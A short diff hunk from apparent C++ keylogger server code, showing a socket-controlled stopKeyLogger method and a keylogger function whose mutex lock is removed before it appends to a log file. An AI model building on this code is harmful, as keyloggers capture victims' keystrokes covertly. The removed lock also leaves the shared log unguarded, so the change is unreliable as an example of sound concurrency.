@@ -368,7 +368,7 @@ void Server::stopKeyLogger(SOCKET clientSocket) {
 // Main keylogger function
 void Server::keyLogger() {
     // FreeConsole();
-    std::lock_guard<std::mutex> lock(logMutex);
+   
     FILE* OUTPUT_FILE = fopen(logFilePath.c_str(), "a+");
     if (OUTPUT_FILE == nullptr) return;
 
